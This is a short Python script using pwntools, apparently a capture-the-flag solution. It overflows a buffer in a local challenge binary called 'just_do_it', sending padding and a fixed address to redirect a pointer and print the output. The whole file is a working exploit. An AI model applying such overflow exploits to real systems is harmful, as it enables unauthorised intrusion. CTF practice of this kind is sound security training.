from pwn import *

p = process('./just_do_it')

# 0x28 - 0x14


p.sendline(b"\x00" * 20 + p32(0x0804a080))

print(p.recvall())
